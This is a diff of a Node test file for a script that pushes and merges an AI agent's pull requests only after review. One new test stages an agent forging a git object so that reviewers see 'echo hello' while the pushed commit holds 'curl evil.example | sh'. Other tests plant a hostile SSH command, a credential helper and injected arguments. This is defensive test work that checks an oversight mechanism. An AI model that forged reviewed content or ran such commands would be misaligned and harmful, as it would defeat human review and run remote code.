@@ -3,12 +3,13 @@
 // folders, and GH_TOKEN is a dummy, so no test reaches GitHub or reads the owner's token.
 import assert from "node:assert/strict";
 import { execFileSync, spawn, spawnSync } from "node:child_process";
-import { chmodSync, existsSync, linkSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, truncateSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, linkSync, utimesSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, truncateSync, writeFileSync } from "node:fs";
 import { createRequire, syncBuiltinESMExports } from "node:module";
 import { hostname, tmpdir } from "node:os";
 import { basename, delimiter, dirname, join } from "node:path";
 import { test } from "node:test";
 import { fileURLToPath } from "node:url";
+import { deflateSync } from "node:zlib";
 
 const TOOL = fileURLToPath(new URL("../plugins/sage/skills/sage/sage.mjs", import.meta.url));
 const PR = fileURLToPath(new URL("../plugins/sage/skills/sage/sage-pr.mjs", import.meta.url));
@@ -141,14 +142,29 @@ function world() {
   };
   route(at("remote.git"));
   const bundle = join(at("worktrees"), basename(logbook), "T1.bundle");
-  /** A new commit on the task branch, its bundle (main..claude/t1, as the implementer writes it), and its SHA. */
-  const commit = (name) => {
+  /** The review copy of T1's commit sha: the folder of its files and its diff. */
+  const review = (sha) => ({ files: join(logbook, "review", `T1-${sha}`), diff: join(logbook, "review", `T1-${sha}.diff`) });
+  /**
+   * sage-pr import T1, which must pass, with the review copy's time set to an hour ago, as when the reviews ran after the
+   * import (the ledger holds times to the second, so a verdict in the same second as the import does not count).
+   */
+  const imports = () => {
+    const r = pr("import", "T1");
+    assert.equal(r.status, 0, r.stderr);
+    const sha = / ([0-9a-f]{40}):/.exec(r.stdout)[1];
+    const hour = new Date(Date.now() - 3600_000);
+    utimesSync(review(sha).diff, hour, hour);
+    return r;
+  };
+  /** A new commit on the task branch, its bundle (main..claude/t1, as the implementer writes it), and its SHA; then imported (unless told not to). */
+  const commit = (name, { imported = true } = {}) => {
     writeFileSync(at("project", name), `${name}\n`);
     p("add", name);
     p("commit", "-q", "-m", name);
     mkdirSync(join(bundle, ".."), { recursive: true });
     rmSync(bundle, { force: true });
     p("bundle", "create", "-q", bundle, "main..claude/t1");
+    if (imported) imports();
     return p("rev-parse", "HEAD");
   };
   const calls = () => (existsSync(at("gh.log")) ? readFileSync(at("gh.log"), "utf8").trim().split("\n").map((l) => JSON.parse(l)) : []);
@@ -177,7 +193,7 @@ function world() {
   /** The refs of the mirror: none until the script fetched. */
   const mirrored = () => git("--git-dir", mirror, "for-each-ref");
   const kills = () => (existsSync(at("kills")) ? readFileSync(at("kills"), "utf8") : "");
-  return { at, env, git, p, sage, pr, logbook, mirror, route, mirrored, kills, bundle, commit, calls, remote, task, forge, github };
+  return { at, env, git, p, sage, pr, logbook, mirror, route, mirrored, kills, bundle, commit, imports, review, calls, remote, task, forge, github };
 }
 
 /** A refusal: exit 1, and stderr starts with "sage-pr: refused:" and matches why. */
@@ -225,6 +241,7 @@ test("create again: no second pull request, a repair's head goes out fast-forwar
   w.p("commit", "-q", "--amend", "-m", "c rewritten");
   rmSync(w.bundle);
   w.p("bundle", "create", "-q", w.bundle, "main..claude/t1");
+  w.imports();
   const rewritten = w.p("rev-parse", "HEAD");
   w.sage("verdict", "T1", "--sha", rewritten, "--kind", "checks-pass");
   refused(w.pr("create", "T1"), new RegExp(`the remote claude/t1 is at ${repaired.slice(0, 7)}, and ${rewritten.slice(0, 7)} does not follow from it: a push would not be a fast-forward\. The remote branch moved: review its tip, or ask the user$`, "m"));
@@ -271,13 +288,15 @@ test("merge runs the merge check, merges only the reviewed head, and fetches the
   assert.notEqual(main, head); // the stand-in squashed: the new main is a new commit that the mirror fetched
 });
 
-test("the argument grammar: exactly create, view or merge and a task id; everything else refuses before any git or gh", () => {
+test("the argument grammar: exactly import, create, view or merge and a task id; everything else refuses before any git or gh", () => {
   const w = world();
-  const head = w.commit("b.txt");
+  const head = w.commit("b.txt", { imported: false });
   w.sage("verdict", "T1", "--sha", head, "--kind", "checks-pass");
   const cases = [
     [[], /expected 2 arguments .*got 0/],
     [["create"], /expected 2 arguments .*got 1/],
+    [["import", "T1", "--output=/tmp/x"], /expected 2 arguments .*got 3/],
+    [["import", "1"], /the task id is T and digits/],
     [["merge", "T1", "--admin"], /expected 2 arguments .*got 3/],
     [["merge", "1", "-R", "evil/repo"], /expected 2 arguments .*got 4/],
     [["create", "T1", "--body-file", "/etc/hosts"], /expected 2 arguments .*got 4/],
@@ -291,9 +310,9 @@ test("the argument grammar: exactly create, view or merge and a task id; everyth
     [["view", "T01"], /the task id is T and digits/],
     [["view", "T1 "], /the task id is T and digits/],
     [["view", "t1"], /the task id is T and digits/], // T96-C3: only a capital T
-    [["--admin", "T1"], /the verb is create, view or merge/],
-    [["pr", "T1"], /the verb is create, view or merge/],
-    [["Create", "T1"], /the verb is create, view or merge/],
+    [["--admin", "T1"], /the verb is import, create, view or merge/],
+    [["pr", "T1"], /the verb is import, create, view or merge/],
+    [["Create", "T1"], /the verb is import, create, view or merge/],
     [["view", "T2"], /no task T2/],
   ];
   for (const [args, why] of cases) refused(w.pr(...args), why);
@@ -313,7 +332,7 @@ test("the bundle: a link, a second hard link, a folder, a file over the limit or
     [() => symlinkSync(good, w.bundle), /is a link, not a plain file/],
     [() => linkSync(good, w.bundle), /the bundle (.*) has 2 links, not 1: remove it, then write it with git bundle create \1 main\.\.claude\/t1$/m],
     [() => mkdirSync(w.bundle), /the bundle (.*) is not a plain file: remove it, then write it with git bundle create \1 main\.\.claude\/t1$/m],
-    [() => (writeFileSync(w.bundle, ""), truncateSync(w.bundle, 100 * 1024 * 1024 + 1)), /the bundle .* is over 104857600 bytes: the bundle is too big, ask the user$/m],
+    [() => (writeFileSync(w.bundle, ""), truncateSync(w.bundle, 10 * 1024 * 1024 + 1)), /the bundle .* is over 10485760 bytes: the bundle is too big, ask the user$/m],
     [() => {}, /no bundle at (.*T1\.bundle): write it with git bundle create \1 main\.\.claude\/t1$/m],
     [() => writeFileSync(w.bundle, "not a bundle\n"), /T1\.bundle is not a git bundle: it does not start with "# v2 git bundle" or "# v3 git bundle"\. Write it with git bundle create .*T1\.bundle main\.\.claude\/t1/],
     [() => writeFileSync(w.bundle, ""), /T1\.bundle is empty\. Write it with git bundle create/],
@@ -327,7 +346,7 @@ test("the bundle: a link, a second hard link, a folder, a file over the limit or
     refused(w.pr("create", "T1"), why);
   }
   assert.equal(w.remote("refs/heads/claude/t1"), "");
-  assert.deepEqual(w.calls().map((c) => c.args[1]), ["list"], "the last bundle passes the file checks, so only the lookup of merged pull requests ran");
+  assert.deepEqual(new Set(w.calls().map((c) => c.args[1])), new Set(["list"]), "each case refuses after the lookup of merged pull requests, before a push or a create");
 });
 
 test("a bundle whose tip is not the reviewed head refuses", () => {
@@ -421,7 +440,7 @@ test("T96-C1: a merge whose mirror refresh fails exits 3 and says that it merged
   const r = w.pr("merge", "T1");
   assert.equal(r.status, 3, r.stderr);
   assert.equal(r.stdout, "");
-  assert.equal(r.stderr, `sage-pr: merged claude/t1 at ${short(head)}; the mirror refresh failed: git fetch failed with exit 1. Run sage-pr merge T1 again later: it reports "already merged" and refreshes the mirror\n`);
+  assert.equal(r.stderr, `sage-pr: merged claude/t1 at ${short(head)}; the mirror refresh failed: git fetch failed with exit 1: run sage-pr again. Run sage-pr merge T1 again later: it reports "already merged" and refreshes the mirror\n`);
   assert.notEqual(w.remote("refs/heads/main"), before, "the merge happened");
 });
 
@@ -433,7 +452,7 @@ test("T96-R2-AFTEREXIT3: merge again after exit 3 says already merged, refreshes
   const main = w.remote("refs/heads/main");
   let r = w.pr("merge", "T1"); // the lock is still held: the refresh fails again
   assert.equal(r.status, 3, r.stderr);
-  assert.equal(r.stderr, `sage-pr: already merged: claude/t1 at ${short(head)}; nothing to do; the mirror refresh failed: git fetch failed with exit 1. Run sage-pr merge T1 again later: it reports "already merged" and refreshes the mirror\n`);
+  assert.equal(r.stderr, `sage-pr: already merged: claude/t1 at ${short(head)}; nothing to do; the mirror refresh failed: git fetch failed with exit 1: run sage-pr again. Run sage-pr merge T1 again later: it reports "already merged" and refreshes the mirror\n`);
   rmSync(lock);
   r = w.pr("merge", "T1");
   assert.equal(r.status, 0, r.stderr);
@@ -570,7 +589,7 @@ test("T96-S2: no message prints the origin's user or password, nor the arguments
   w.route(`${w.at("nowhere")}//user:s3cret-token@host/repo.git`); // a local path: the fetch fails with no network
   r = w.pr("create", "T1");
   assert.equal(r.status, 2, r.stderr);
-  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128\n");
+  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128: run sage-pr again\n");
 });
 
 test("T96-S4: a fork's open pull request with the task's branch name is not the task's", () => {
@@ -730,7 +749,8 @@ test("the script starts git and gh only through execFile with an argument array,
   const src = readFileSync(PR, "utf8");
   assert.deepEqual([...src.matchAll(/import \{([^}]*)\} from "node:child_process"/g)].map((m) => m[1].trim()), ["execFileSync"]);
   assert.doesNotMatch(src, /\bshell\s*:|\bexecSync\b|\bspawn(Sync)?\b|(?<![.\w])exec\(/);
-  assert.deepEqual([...src.matchAll(/execFileSync\(("[^"]*")/g)].map((m) => m[1]), ['"gh"']); // git goes through sage.mjs git(), which is execFileSync too
+  assert.deepEqual([...src.matchAll(/execFileSync\(("[^"]*"|\w+)/g)].map((m) => m[1]), ["program", '"gh"']);
+  assert.deepEqual([...new Set([...src.matchAll(/runFile\(("[^"]*"|\w+)/g)].map((m) => m[1]))], ["program", '"git"', '"tar"']); // runFile's own definition, then its callers
 });
 
 /** A world with T1's head reviewed (checks only), not yet created. */
@@ -827,17 +847,18 @@ test("T96-S13-SSH: GIT_SSH_COMMAND does not reach git; an ssh origin goes throug
   w.env.GIT_SSH_COMMAND = planted.script; // R615 E4d
   const r = w.pr("create", "T1");
   assert.equal(r.status, 2, r.stderr);
-  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128\n");
+  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128: run sage-pr again\n");
   assert.equal(planted.ran(), false);
   assert.equal(onPath.ran(), true, "git ran ssh from PATH");
 });
 
 test("T96-S13-NODEOPTIONS: NODE_OPTIONS refuses before any git or gh", () => {
   const { w } = ready();
+  const before = w.mirrored();
   w.env.NODE_OPTIONS = "--no-warnings";
   refused(w.pr("create", "T1"), /^sage-pr: refused: NODE_OPTIONS is set, and it can run code inside the script\. Run sage-pr without it: env -u NODE_OPTIONS node sage-pr\.mjs <verb> <task>\n$/);
   assert.deepEqual(w.calls(), []);
-  assert.equal(w.mirrored(), "");
+  assert.equal(w.mirrored(), before);
 });
 
 test("T96-S14-PARENTLINK: a bundle whose folder is a link to another place refuses", () => {
@@ -847,7 +868,7 @@ test("T96-S14-PARENTLINK: a bundle whose folder is a link to another place refus
   renameSync(folder, w.at("elsewhere", "moved")); // R615 E3
   symlinkSync(w.at("elsewhere", "moved"), folder);
   refused(w.pr("create", "T1"), /^sage-pr: refused: the bundle's folder .* is a link to .*\/elsewhere\/moved, not a folder in the worktree root: remove the link, then write the bundle with git bundle create .*\/T1\.bundle main\.\.claude\/t1\n$/);
-  assert.deepEqual(w.calls(), []);
+  assert.deepEqual(w.calls().map((c) => c.args[1]), ["list"], "only the lookup of merged pull requests");
 });
 
 test("T96-S14-FETCHHEAD: the mirror keeps no FETCH_HEAD, which would hold the origin's address", () => {
@@ -869,7 +890,7 @@ test("T96-S14-CREDHELPER: a credential helper in the mirror's config never runs;
     const config = join(w.logbook, "mirror.git", "config");
     writeFileSync(config, `${readFileSync(config, "utf8")}[http]\n\tsslCAInfo = ${w.at("cert.pem")}\n[credential]\n\thelper = !${helper.script}\n`); // R615 E6
     const r = w.pr("create", "T1");
-    assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128\n");
+    assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 128: run sage-pr again\n");
     assert.equal(helper.ran(), false, "the mirror's helper did not run");
   } finally {
     server.kill();
@@ -956,11 +977,12 @@ test("T165-F: the state tool and the PR script take one PR-number rule: no leadi
 
 test("T165-I: a lock or disk error on the bundle fetch or the ancestor check is a failure (exit 2), not a refusal", () => {
   const { w, head } = ready();
+  w.git("--git-dir", w.mirror, "update-ref", "-d", "refs/sage/T1"); // the import fetched it: the fetch must write it again
   mkdirSync(join(w.mirror, "refs", "sage"), { recursive: true });
   writeFileSync(join(w.mirror, "refs", "sage", "T1.lock"), ""); // another git holds the ref
   let r = w.pr("create", "T1");
   assert.equal(r.status, 2, r.stderr);
-  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 1\n");
+  assert.equal(r.stderr, "sage-pr: failed: git fetch failed with exit 1: run sage-pr again\n");
   rmSync(join(w.mirror, "refs", "sage", "T1.lock"));
   // git on PATH that fails merge-base as a disk error does (exit 128), while the commits are there.
   const real = process.env.PATH.split(delimiter).map((d) => join(d, "git")).find((f) => existsSync(f));
@@ -969,7 +991,7 @@ test("T165-I: a lock or disk error on the bundle fetch or the ancestor check is 
   writeFileSync(w.at("bin", "fail-merge-base"), "");
   r = w.pr("create", "T1");
   assert.equal(r.status, 2, r.stderr);
-  assert.equal(r.stderr, "sage-pr: failed: git merge-base failed with exit 128\n");
+  assert.equal(r.stderr, "sage-pr: failed: git merge-base failed with exit 128: run sage-pr again\n");
   assert.equal(w.remote("refs/heads/claude/t1"), "", "nothing pushed");
   rmSync(w.at("bin", "fail-merge-base"));
   r = w.pr("create", "T1");
@@ -1072,7 +1094,7 @@ test("T166-A: a gh merge that fails after GitHub merged (a branch deletion that 
   writeFileSync(join(w2.mirror, "refs", "heads", "main.lock"), "");
   const r2 = w2.pr("merge", "T1");
   assert.equal(r2.status, 3, r2.stderr);
-  assert.match(r2.stderr, new RegExp(`^sage-pr: merged claude/t1 at ${short(head2)} \\(GitHub merged it, but gh pr merge failed: .*\\); the mirror refresh failed: git fetch failed with exit 1\\.`));
+  assert.match(r2.stderr, new RegExp(`^sage-pr: merged claude/t1 at ${short(head2)} \\(GitHub merged it, but gh pr merge failed: .*\\); the mirror refresh failed: git fetch failed with exit 1: run sage-pr again\\.`));
 });
 
 test("T166-B: a work folder that the script cannot remove gives a warning on stderr and keeps the exit code", () => {
@@ -1105,13 +1127,14 @@ test("T168: merge refuses a task that is not verified or pr-ready; an already me
 
 test("T169: a call waits for the logbook's lock before it uses the mirror, and fails when the lock stays held", () => {
   const { w } = ready();
+  const before = w.mirrored();
   mkdirSync(join(w.logbook, ".lock"));
   writeFileSync(join(w.logbook, ".lock", "00000000-0000-4000-8000-000000000002.json"), JSON.stringify({ pid: 424243, host: hostname(), start: Date.now() - 1000, at: Date.now() })); // alive: SAGE_TEST_PIDS is {}
   const r = w.pr("create", "T1");
   assert.equal(r.status, 2, r.stderr);
   assert.match(r.stderr, /^sage-pr: failed: the logbook is busy: pid 424243 on .* has held .*\/\.lock for [0-9.]+ s\. Nothing changed\. Run the command again/);
   assert.deepEqual(w.calls(), []);
-  assert.equal(w.mirrored(), "", "the mirror is untouched");
+  assert.equal(w.mirrored(), before, "the mirror is untouched");
   assert.equal(w.remote("refs/heads/claude/t1"), "");
   assert.equal(w.kills(), "");
 });
@@ -1251,4 +1274,121 @@ test("T165-C3-OWNER: the task's own pull request counts after the owner is renam
   const r = w.pr("create", "T1");
   assert.equal(r.stdout, `pushed ${short(head)} to claude/t1; pull request #1 https://github.com/owner/repo/pull/1 is open; T1 has PR 1 in the logbook\n`, r.stderr);
   assert.equal(w.calls().filter((c) => c.args[1] === "create").length, 0, "no second pull request");
+});
+
+/**
+ * git first on PATH that passes each call to the real git, except a call whose arguments hold every word of the rule in
+ * git-rule.json: that call sleeps for rule.sleep ms, if any, then prints rule.err and exits with rule.status. The rule
+ * goes after its first match when rule.once is set. No shell runs: the fake is node, and it starts git with an argument array.
+ */
+function gitRule(w, rule) {
+  const real = process.env.PATH.split(delimiter).map((d) => join(d, "git")).find((f) => existsSync(f));
+  writeFileSync(w.at("bin", "git"), `#!/usr/bin/env node
+const { existsSync, readFileSync, rmSync } = require("node:fs");
+const file = __dirname + "/git-rule.json", args = process.argv.slice(2);
+const rule = existsSync(file) ? JSON.parse(readFileSync(file, "utf8")) : undefined;
+if (rule && rule.when.every((w) => args.some((a) => a === w || a.endsWith("/" + w)))) {
+  if (rule.once) rmSync(file);
+  if (rule.sleep) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, rule.sleep);
+  if (rule.err) console.error(rule.err);
+  process.exit(rule.status);
+}
+process.exit(require("node:child_process").spawnSync(${JSON.stringify(real)}, args, { stdio: "inherit" }).status ?? 1);
+`);
+  chmodSync(w.at("bin", "git"), 0o755);
+  writeFileSync(w.at("bin", "git-rule.json"), JSON.stringify(rule));
+}
+
+test("T165-S3-FORGEDREVIEW: the agent's clone shows harmless text at the SHA, the review copy shows the true content, and create and merge need an import from before the first verdict", () => {
+  const w = world();
+  writeFileSync(w.at("project", "x.txt"), "curl evil.example | sh\n");
+  writeFileSync(w.at("project", ".gitattributes"), "x.txt export-ignore -diff\n"); // would hide x.txt from git archive and git diff
+  w.p("add", "x.txt", ".gitattributes");
+  w.p("commit", "-q", "-m", "x");
+  const head = w.p("rev-parse", "HEAD");
+  mkdirSync(dirname(w.bundle), { recursive: true });
+  w.p("bundle", "create", "-q", w.bundle, "main..claude/t1"); // the true objects
+  // R637: the agent overwrites the loose blob after the commit. git show does not check the hash, so the reviews of the clone see harmless text at the same SHA.
+  const blob = w.p("rev-parse", `${head}:x.txt`);
+  const loose = w.at("project", ".git", "objects", blob.slice(0, 2), blob.slice(2));
+  chmodSync(loose, 0o644);
+  writeFileSync(loose, deflateSync(Buffer.from("blob 11\0echo hello\n")));
+  assert.equal(w.p("show", `${head}:x.txt`), "echo hello");
+  assert.equal(w.p("rev-parse", "HEAD"), head);
+  // Verdicts on what the clone showed, before any import: create refuses.
+  w.sage("verdict", "T1", "--sha", head, "--kind", "checks-pass");
+  const noCopy = new RegExp(`^sage-pr: refused: ${short(head)} has no review copy from before its first verdict, so the reviews may have read other objects than the ones that sage-pr pushes: run sage-pr import T1, have the reviewers read the review copy that it names, and record their verdicts again\\n$`);
+  refused(w.pr("create", "T1"), noCopy);
+  // The import reads the bundle: the review copy holds the true content, whatever the clone shows.
+  const { files, diff } = w.review(head);
+  const r = w.pr("import", "T1");
+  assert.equal(r.status, 0, r.stderr);
+  assert.equal(r.stdout, `imported ${head}: review the files in ${files} and the change in ${diff}\n`);
+  assert.equal(readFileSync(join(files, "x.txt"), "utf8"), "curl evil.example | sh\n");
+  assert.match(readFileSync(diff, "utf8"), /^\+curl evil\.example \| sh$/m);
+  assert.deepEqual(readdirSync(w.logbook).filter((n) => n.startsWith(".sage-pr-")), [], "no work folder is left");
+  // An import after the first verdict does not count: create still refuses, and pushes nothing.
+  refused(w.pr("create", "T1"), noCopy);
+  assert.equal(w.remote("refs/heads/claude/t1"), "");
+  // The same import again prints the same line and changes nothing.
+  const time = statSync(diff).mtimeMs;
+  const again = w.pr("import", "T1");
+  assert.equal(again.stdout, r.stdout, again.stderr);
+  assert.equal(statSync(diff).mtimeMs, time);
+  // Reviews after the import (its time an hour back): create passes; merge refuses once the copy is newer than the first verdict.
+  const hour = new Date(Date.now() - 3600_000);
+  utimesSync(diff, hour, hour);
+  for (const kind of ["review-clean", "qa-pass"]) w.sage("verdict", "T1", "--sha", head, "--kind", kind);
+  assert.equal(w.pr("create", "T1").status, 0);
+  w.forge("T1", "state", "verified");
+  const later = new Date(Date.now() + 3600_000);
+  utimesSync(diff, later, later);
+  refused(w.pr("merge", "T1"), noCopy);
+  assert.equal(w.calls().filter((c) => c.args[1] === "merge").length, 0);
+  rmSync(diff);
+  refused(w.pr("merge", "T1"), noCopy);
+  w.imports(); // a new import; then its time an hour back
+  const m = w.pr("merge", "T1");
+  assert.equal(m.status, 0, m.stderr);
+});
+
+test("T165-S4-BUNDLEDOS: a bundle fetch, archive or diff that takes too long stops with exit 2 and frees the lock", () => {
+  const w = world();
+  w.env.SAGE_PR_TIMEOUT = "2";
+  const head = w.commit("b.txt", { imported: false });
+  for (const [when, verb] of [[["fetch", "task.bundle"], "import"], [["archive"], "import"], [["diff", "--no-ext-diff"], "import"], [["fetch", "task.bundle"], "create"]]) {
+    if (verb === "create") (w.imports(), w.sage("verdict", "T1", "--sha", head, "--kind", "checks-pass"));
+    gitRule(w, { when, sleep: 60_000, status: 0 });
+    const r = w.pr(verb, "T1"); // the fake sleeps 60 s, and the test stops a call at 20 s: exit 2 shows that the script stopped it
+    assert.equal(r.status, 2, `${when}: ${r.stderr}`);
+    assert.equal(r.stderr, `sage-pr: failed: git ${when[0]} took over 2 s and was stopped: run it again. If it stops again, the bundle holds too much data: ask the user\n`);
+    if (verb === "import") assert.equal(existsSync(w.review(head).diff), false, "no review copy from a stopped import");
+    assert.deepEqual(readdirSync(w.logbook).filter((n) => n.startsWith(".sage-pr-") || n === ".lock"), [], "no work folder, and the lock is free");
+    rmSync(w.at("bin", "git-rule.json"));
+  }
+  assert.equal(w.pr("create", "T1").status, 0, "the next call runs");
+});
+
+test("T165-Q8-TRANSIENT: a git failure that is not git's own result 'not a repository' or 'not a bundle' is exit 2, not a refusal", () => {
+  const { w, head } = ready();
+  const cases = [
+    [{ when: ["--is-bare-repository"], status: 128, err: "fatal: unable to read config: Input/output error" }, "git rev-parse failed with exit 128"],
+    [{ when: ["bundle", "verify"], status: 128, err: "fatal: read error: Input/output error" }, "git bundle failed with exit 128"],
+    [{ when: ["bundle", "verify"], status: 1, err: "error: could not read: Resource temporarily unavailable" }, "git bundle failed with exit 1"],
+    [{ when: ["bundle", "list-heads"], status: 128, err: "fatal: read error: Input/output error" }, "git bundle failed with exit 128"],
+  ];
+  for (const [rule, message] of cases) {
+    gitRule(w, { ...rule, once: true });
+    const r = w.pr("create", "T1");
+    assert.equal(r.status, 2, `${rule.when}: ${r.stderr}`);
+    assert.equal(r.stderr, `sage-pr: failed: ${message}: run sage-pr again\n`);
+    assert.equal(existsSync(w.mirror), true, "the mirror stays");
+  }
+  // git's own results still refuse: a folder that is not a repository, and a file that is not a bundle.
+  rmSync(w.at("bin", "git"));
+  writeFileSync(w.bundle, "# v2 git bundle\nnot really\n");
+  refused(w.pr("create", "T1"), /the bundle is not a git bundle of the branch claude\/t1/);
+  w.p("bundle", "create", "-q", w.bundle, "main..claude/t1");
+  assert.equal(w.pr("create", "T1").status, 0, "after the transient failures, the same call passes");
+  assert.equal(w.remote("refs/heads/claude/t1"), head);
 });
